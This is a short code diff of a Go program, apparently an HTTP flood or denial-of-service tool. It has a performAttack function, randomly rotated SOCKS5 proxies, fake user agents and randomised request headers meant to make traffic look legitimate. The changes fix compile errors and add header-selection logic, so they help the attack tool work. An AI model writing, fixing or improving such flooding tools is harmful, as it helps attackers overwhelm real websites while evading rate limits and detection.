@@ -17,7 +17,7 @@ import (
 	"sync/atomic"
 	"time"
 	
-	"github.com/EDDYCJY/fake-useragent"
+	fakeuseragent "github.com/EDDYCJY/fake-useragent"
 )
 
 // 配置结构
@@ -204,7 +204,7 @@ func worker(config *Config, rateLimit <-chan time.Time) {
 
 func performAttack(config *Config) bool {
 	// 解析URL
-	u, err := url.Parse(config.TargetURL)
+	_, err := url.Parse(config.TargetURL)
 	if err != nil {
 		return false
 	}
@@ -213,7 +213,7 @@ func performAttack(config *Config) bool {
 	var client *http.Client
 	if len(proxies) > 0 {
 		proxy := proxies[rand.Intn(len(proxies))]
-		client = createSOCKS5Client(proxy, config.Timeout)
+		client = createSOCKS5Client(proxy, strconv.Itoa(config.Timeout))
 	} else {
 		// 代理为空，使用直连
 		client = createDirectClient(config.Timeout)
@@ -449,6 +449,16 @@ func generateRandomHeaders(req *http.Request, config *Config) {
 	// 随机选择HTTP头数量 (5-15个)
 	headerCount := rand.Intn(11) + 5
 	selectedHeaders := make(map[string]bool)
+	
+	// 使用headerCount变量来控制循环次数
+	for i := 0; i < headerCount; i++ {
+		// 随机选择头类型
+		headerTypes := []string{"Accept", "Accept-Language", "Accept-Encoding", "Cache-Control", "Connection", "Upgrade-Insecure-Requests", "Sec-Fetch-Dest", "Sec-Fetch-Mode", "Sec-Fetch-Site", "Sec-Fetch-User"}
+		headerType := headerTypes[rand.Intn(len(headerTypes))]
+		if !selectedHeaders[headerType] {
+			selectedHeaders[headerType] = true
+		}
+	}
 	
 	// 基础头列表 - 更多样化
 	acceptTypes := []string{
